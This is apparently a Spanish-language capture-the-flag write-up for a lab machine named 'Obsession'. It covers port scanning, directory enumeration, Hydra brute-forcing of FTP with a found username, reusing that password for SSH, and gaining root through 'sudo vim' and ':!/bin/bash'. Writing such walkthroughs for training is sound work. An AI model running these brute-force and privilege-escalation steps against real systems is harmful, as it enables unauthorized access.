# Obsession

## Descripción

Laboratorio enfocado en la enumeración de rutas web y el análisis de servicios de red, principalmente **FTP** y **SSH**.

---

# Enumeración

## Comprobar conectividad

Primero se verifica que la máquina esté activa.

```bash
ping -c 4 172.17.0.2
```

El TTL es **64**, por lo que probablemente se trata de una máquina Linux.

---

## Escaneo de puertos

```bash
nmap -sV 172.17.0.2
```

Resultado:

| Puerto | Servicio | Versión |
|---------|----------|----------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 |

Al existir un servidor web, conviene buscar directorios ocultos.

---

# Enumeración Web

Se utiliza **Gobuster**.

```bash
gobuster dir \
-u http://172.17.0.2/ \
-w /usr/share/wordlists/dirb/common.txt \
-x html,php,txt
```

Directorios encontrados:

- `/backup`
- `/important`

---

## Directorio `/backup`

Contiene el archivo:

```
backup.txt
```

Contenido:

```text
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Ya tenemos un usuario válido:

```
russoski
```

---

## Directorio `/important`

Existe un archivo:

```
important.md
```

Contiene el manifiesto hacker, sin información útil para la máquina.

---

# Análisis de metadatos

Se revisan ambos archivos con ExifTool.

```bash
exiftool backup.txt
```

```bash
exiftool important.md
```

No contienen información relevante.

---

# Fuerza bruta sobre FTP

Como ya conocemos el usuario, solo queda descubrir la contraseña.

```bash
hydra -l russoski \
-P /usr/share/wordlists/rockyou.txt \
ftp://172.17.0.2 \
-t 4 -v
```

Credenciales encontradas:

```
Usuario: russoski
Contraseña: iloveme
```

---

# Acceso FTP

Se inicia sesión utilizando las credenciales.

```bash
ftp 172.17.0.2
```

Dentro del servidor se encuentra una imagen.

```ftp
get "Nikola Tesla.jpg"
```

---

# Análisis de la imagen

```bash
exiftool "Nikola Tesla.jpg"
```

No hay información interesante en los metadatos.

La imagen contiene la frase:

> *What one man's call God, another calls the laws of physics.*

No aporta información útil para la explotación.

---

# Más archivos en FTP

Listado:

```ftp
ls -a
```

Archivos encontrados:

- README.md
- Strong-Credentials.py

Se descargan:

```ftp
get "README.md"
get "Strong-Credentials.py"
```

---

## README.md

```
Para más Scripts en Python o Bash relacionados a la Ciberseguridad, visita mi GitHub:
https://github.com/russ0ski
```

No aporta información útil.

---

## Strong-Credentials.py

Es un script que genera contraseñas aleatorias.

Al ejecutarlo:

```bash
python3 Strong-Credentials.py
```

Obtiene algo similar a:

```
};Y6rpbyW]NM1=djfskQ
```

En un principio parecía que esa contraseña podría servir para SSH.

Sin embargo, fue una pista falsa.

---

# Acceso SSH

Simplemente se reutiliza la misma contraseña encontrada para FTP.

```bash
ssh russoski@172.17.0.2
```

Contraseña:

```
iloveme
```

El acceso es exitoso.

---

# Escalada de privilegios

Se revisan los permisos sudo.

```bash
sudo -l
```

Resultado:

```
(root) NOPASSWD: /usr/bin/vim
```

Esto permite ejecutar **Vim** como **root** sin contraseña.

```bash
sudo vim
```

Desde Vim se obtiene una shell de root.

```vim
:!/bin/bash
```

Comprobación:

```bash
whoami
```

Salida:

```
root
```

---

# Conclusión

La ruta de explotación fue:

1. Enumeración con Nmap.
2. Descubrimiento de directorios mediante Gobuster.
3. Obtención del usuario desde `backup.txt`.
4. Ataque de fuerza bruta contra FTP con Hydra.
5. Reutilización de la contraseña de FTP para SSH.
6. Escalada de privilegios gracias a `sudo vim` con `NOPASSWD`.

> **Nota:** El análisis de la imagen y del script de generación de contraseñas fue una distracción. La contraseña de SSH era exactamente la misma que la utilizada en FTP.
